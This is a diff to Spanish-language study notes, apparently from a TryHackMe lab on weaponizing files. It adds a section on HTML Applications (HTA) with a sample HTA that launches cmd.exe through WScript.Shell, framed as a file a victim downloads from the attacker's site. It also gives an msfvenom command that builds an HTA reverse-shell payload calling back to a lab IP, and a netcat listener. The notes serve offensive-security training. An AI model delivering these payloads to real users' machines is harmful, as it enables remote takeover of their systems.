@@ -50,3 +50,35 @@ c:\Windows\System32>cscript.exe c:\Users\thm\Desktop\payload.vbs
 c:\Windows\System32>wscript /e:VBScript c:\Users\thm\Desktop\payload.txt
 ```
 
+# APLICACION HTML
+
+HTA es "HTML Application" nos deja crear archivos descargables para coger toda la información que nos enseña y renderizarla. HTMl aplicacion son paginas HTML dinamicas que contienen Javascript y VBScript. 
+
+```
+<html>
+<body>
+<script>
+	var c= 'cmd.exe'
+	new ActiveXObject('WScript.Shell').Run(c);
+</script>
+</body>
+</html>
+```
+
+Imaginemos que la victima se mete a nuestra web y descarga el .hta
+
+![image](https://github.com/user-attachments/assets/2519a2a3-de25-44e3-b326-35c332cf5367)
+
+![image](https://github.com/user-attachments/assets/25777adc-def3-49b2-ad01-632a09f2436a)
+
+![image](https://github.com/user-attachments/assets/65776216-9ae9-4d6d-a685-99689467c3d5)
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta
+sudo nc -lvp 443
+```
+
+
+
+
+
